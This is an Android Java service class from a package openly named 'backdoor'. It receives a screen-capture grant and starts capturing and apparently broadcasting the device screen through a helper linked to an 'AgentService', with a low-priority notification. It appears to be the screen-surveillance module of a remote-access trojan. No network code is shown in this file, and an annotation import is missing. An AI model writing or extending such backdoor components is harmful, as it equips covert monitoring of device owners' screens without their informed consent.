package com.lazyframework.backdoor;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

@RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
public class ScreenMirrorService extends Service {
    private static final String TAG = "ScreenMirrorService";
    private static final String CHANNEL_ID = "screen_mirror_channel";
    
    private MediaProjectionManager projectionManager;
    private MediaProjection mediaProjection;
    private ScreenMirrorHelper mirrorHelper;
    private Handler handler;
    
    // ==================== REQUEST CODE ====================
    private static final int PROJECTION_REQUEST_CODE = 100;
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "🎬 ScreenMirrorService created");
        
        projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        handler = new Handler(Looper.getMainLooper());
        
        // Create notification
        createNotificationChannel();
        startForeground(2, createNotification());
        
        // Initialize screen mirror helper
        mirrorHelper = new ScreenMirrorHelper();
        mirrorHelper.onCreate();
        ScreenMirrorHelper.setAgentService(null);  // Set properly dalam AgentService
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "📡 onStartCommand");
        
        if (intent != null && intent.getParcelableExtra("projection") != null) {
            mediaProjection = intent.getParcelableExtra("projection");
            Log.d(TAG, "✅ MediaProjection received");
            startScreenCapture();
        } else {
            // Request screen capture permission
            requestScreenCapturePermission();
        }
        
        return START_STICKY;
    }
    
    // ==================== REQUEST SCREEN CAPTURE ====================
    
    private void requestScreenCapturePermission() {
        try {
            if (projectionManager == null) {
                Log.e(TAG, "❌ MediaProjectionManager is null");
                return;
            }
            
            // ⚠️ PERLU USER INTERACTION - tidak bisa silent
            // Harus trigger dari Activity dengan permission grant
            
            Log.d(TAG, "⚠️ Requires user to grant screen capture permission");
            
            // Ini normalnya triggered from Activity:
            // startActivityForResult(projectionManager.createScreenCaptureIntent(), PROJECTION_REQUEST_CODE);
            
        } catch (Exception e) {
            Log.e(TAG, "Request permission error: " + e.getMessage());
        }
    }
    
    // ==================== START SCREEN CAPTURE ====================
    
    private void startScreenCapture() {
        try {
            if (mediaProjection == null) {
                Log.e(TAG, "❌ MediaProjection is null");
                return;
            }
            
            mirrorHelper.startScreenCapture(mediaProjection);
            Log.d(TAG, "✅ Screen capture started");
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Start screen capture error: " + e.getMessage());
        }
    }
    
    // ==================== STOP SCREEN CAPTURE ====================
    
    private void stopScreenCapture() {
        try {
            if (mirrorHelper != null) {
                mirrorHelper.stopScreenCapture();
            }
            
            if (mediaProjection != null) {
                mediaProjection.stop();
                mediaProjection = null;
            }
            
            Log.d(TAG, "⏹️ Screen capture stopped");
        } catch (Exception e) {
            Log.e(TAG, "Stop screen capture error: " + e.getMessage());
        }
    }
    
    // ==================== NOTIFICATION ====================
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID, 
                "Screen Mirror", 
                NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }
    
    private Notification createNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            return new Notification.Builder(this, CHANNEL_ID)
                    .setContentTitle("Screen Mirror")
                    .setContentText("Broadcasting screen...")
                    .setSmallIcon(android.R.drawable.ic_menu_info_details)
                    .build();
        } else {
            return new Notification.Builder(this)
                    .setContentTitle("Screen Mirror")
                    .setContentText("Broadcasting screen...")
                    .setSmallIcon(android.R.drawable.ic_menu_info_details)
                    .build();
        }
    }
    
    // ==================== LIFECYCLE ====================
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "🔌 ScreenMirrorService destroyed");
        stopScreenCapture();
        if (mirrorHelper != null) {
            mirrorHelper.onDestroy();
        }
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
